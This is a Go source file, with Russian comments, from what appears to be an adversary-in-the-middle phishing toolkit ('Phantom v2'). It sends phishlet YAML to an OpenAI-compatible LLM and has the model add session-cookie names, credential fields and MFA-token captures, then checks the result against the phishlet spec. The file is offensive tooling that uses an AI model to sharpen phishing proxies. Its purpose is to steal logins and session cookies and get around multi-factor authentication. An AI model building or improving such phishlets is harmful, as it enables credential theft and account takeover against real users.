// LLM-refine: улучшение сгенерированного YAML через OpenAI-совместимый API.
// Работает с Ollama (/v1), OpenAI, LiteLLM. Ключ только env LLM_API_KEY.
// Контракт: refine НЕ ломает валидность — выход проверяется Validate,
// при любой ошибке возвращается эвристика + err (graceful degradation).
package phishgen

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/core/phishlet"
	"gopkg.in/yaml.v3"
)

// LLMConfig — подключение.
type LLMConfig struct {
	BaseURL string // http://localhost:11434/v1
	Model   string // llama3 / gpt-4o-mini / ...
	APIKey  string // env LLM_API_KEY (Ollama: пусто)
	HTTP    *http.Client
}

const refinePrompt = `You improve an AiTM phishlet YAML (Phantom v2 spec).
RULES: keep id/version/base_domains/proxy_hosts/lure_path/enabled EXACTLY.
You may ONLY: add auth_tokens keys (session cookie names), extend creds_map,
add mfa_tokens, add sub_filters entries with same triggers_on.
Return ONLY valid YAML, no markdown fences, no comments. YAML:
`

// RefineViaLLM шлет YAML на refine, валидирует ответ спеком.
func RefineViaLLM(yml string, cfg LLMConfig) (string, error) {
	if cfg.BaseURL == "" || cfg.Model == "" {
		return "", fmt.Errorf("llm: base_url and model required")
	}
	cl := cfg.HTTP
	if cl == nil {
		cl = &http.Client{Timeout: 60 * time.Second}
	}
	reqBody, _ := json.Marshal(map[string]any{
		"model": cfg.Model,
		"messages": []map[string]string{
			{"role": "system", "content": "You output only valid YAML."},
			{"role": "user", "content": refinePrompt + yml},
		},
		"temperature": 0.1,
	})
	url := strings.TrimSuffix(cfg.BaseURL, "/") + "/chat/completions"
	req, _ := http.NewRequest(http.MethodPost, url, bytes.NewReader(reqBody))
	req.Header.Set("Content-Type", "application/json")
	if cfg.APIKey != "" {
		req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
	}
	resp, err := cl.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		return "", fmt.Errorf("llm: status %s: %s", resp.Status, string(b))
	}
	var out struct {
		Choices []struct {
			Message struct {
				Content string `json:"content"`
			} `json:"message"`
		} `json:"choices"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return "", err
	}
	if len(out.Choices) == 0 {
		return "", fmt.Errorf("llm: empty choices")
	}
	refined := cleanFences(out.Choices[0].Message.Content)
	var p core.Phishlet
	if err := yaml.Unmarshal([]byte(refined), &p); err != nil {
		return "", fmt.Errorf("llm: bad yaml: %w", err)
	}
	if err := phishlet.Validate(&p); err != nil {
		return "", fmt.Errorf("llm: invalid spec: %w", err)
	}
	return refined, nil
}

func cleanFences(s string) string {
	s = strings.TrimSpace(s)
	s = strings.TrimPrefix(s, "```yaml")
	s = strings.TrimPrefix(s, "```")
	s = strings.TrimSuffix(s, "```")
	return strings.TrimSpace(s)
}
